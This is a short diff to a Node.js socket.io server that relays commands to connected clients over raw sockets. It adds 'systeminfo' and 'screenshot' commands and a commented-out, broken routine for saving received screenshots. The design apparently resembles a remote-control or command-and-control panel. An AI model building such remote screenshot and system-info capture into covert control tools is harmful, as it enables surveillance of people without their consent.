@@ -23,6 +23,14 @@ io.on('connection', function(socket){
         console.log('send hi', obj);
         clients[obj.sid].socket.write('hi\0');
         break;
+      case 'systeminfo':
+        console.log('send systeminfo', obj);
+        clients[obj.sid].socket.write('systeminfo\0');
+        break;
+      case 'screenshot':
+        console.log('send screenshot', obj);
+        clients[obj.sid].socket.write('screenshot\0');
+        break;
     }
   });
 
@@ -39,6 +47,17 @@ function disconnectClient(c) {
 
 function updateClient(c, cmd) {
   io.emit('client:update', {sid: c, uid: clients[c].uid, msg: cmd});
+
+  // if (cmd[0] == '{') cmd = JSON.parse(cmd);
+  // if (cmd.screenshot) {
+  //   fs.writeFile("./imi.bmp", msg.screenshot, function(err) {
+  //     if(err) {
+  //       return console.log(err);
+  //     }
+  //
+  //     console.log("The file was saved!");
+  //   }); 
+  // }
 }
 
 
